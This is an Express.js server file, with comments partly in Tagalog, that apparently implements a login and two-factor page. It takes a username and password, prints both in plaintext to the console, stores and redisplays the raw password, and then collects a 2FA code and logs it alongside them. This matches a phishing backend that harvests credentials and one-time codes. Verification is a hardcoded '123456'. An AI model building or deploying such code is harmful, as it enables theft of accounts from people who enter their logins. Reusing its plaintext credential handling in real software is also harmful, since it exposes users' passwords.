const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session'); // Import express-session
const app = express();
const PORT = 3000;

// Middleware para mag-handle ng URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware para mag-handle ng sessions
app.use(
  session({
    secret: 'your-secret-key', // Secret key for signing the session ID cookie
    resave: false, // Avoid saving session if unmodified
    saveUninitialized: true, // Save uninitialized sessions
  })
);

// Serve static files (e.g., CSS, JS, images)
app.use(express.static('public'));

// Route para mag-serve ng index.html
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route para mag-handle ng login
app.post('/submit', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Save credentials sa session
  req.session.username = username;
  req.session.password = password;

  // Log sa console
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);

  // Redirect sa 2FA page
  res.redirect('/two-factor');
});

// Route para sa 2FA form
app.get('/two-factor', (req, res) => {
  // Check kung may username/password sa session, kung wala, redirect sa login
  if (!req.session.username || !req.session.password) {
    return res.redirect('/');
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Two-Factor Authentication</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #000;
          color: #f1f1f1;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
        }
        .container {
          text-align: center;
          padding: 20px;
          border-radius: 10px;
          background-color: #111;
          box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        input {
          margin: 10px 0;
          padding: 10px;
          font-size: 16px;
          width: 100%;
          border: 2px solid #ff8c00;
          border-radius: 5px;
          background: #000;
          color: #f1f1f1;
        }
        button {
          padding: 10px 20px;
          background: #ff8c00;
          color: #000;
          font-weight: bold;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          font-size: 16px;
        }
        button:hover {
          background: #ffa500;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Two-Factor Authentication</h2>
        <p><strong>Logged Username:</strong> ${req.session.username}</p>
        <p><strong>Logged Password:</strong> ${req.session.password}</p>
        <form action="/verify-2fa" method="POST">
          <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
          <button type="submit">Verify</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

// Route para i-handle ang 2FA verification
app.post('/verify-2fa', (req, res) => {
  const authCode = req.body['auth-code'];

  console.log(`2FA Code: ${authCode}`);
  console.log(`Username: ${req.session.username}`);
  console.log(`Password: ${req.session.password}`);

  if (authCode === '123456') { // Example valid code
    res.send('2FA Verification Successful! Welcome to your account.');
  } else {
    res.send('Invalid 2FA Code. Please try again.');
  }
});

// Simulan ang server sa port 3000
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
